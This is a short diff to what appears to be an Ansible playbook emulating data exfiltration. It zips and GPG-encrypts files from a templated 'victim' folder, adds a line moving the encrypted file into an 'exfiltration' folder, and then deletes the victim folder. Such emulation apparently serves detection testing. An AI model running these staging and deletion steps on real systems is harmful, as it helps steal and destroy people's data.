@@ -18,6 +18,7 @@
         touch a b c d e f g h
         zip --password {{ password_encryption }} {{ exfiltration_folder }}/{{ exfiltration_file }}-enc.zip {{ victim_folder }}/*
         gpg --batch --passphrase {{ password_encryption }} -c /tmp/{{ victim_file}}.txt
+        mv /tmp/{{ victim_file}}.txt.gpg {{ exfiltration_folder }}
    - name: delete temp files
      shell: |
        rm -r {{ victim_folder }}
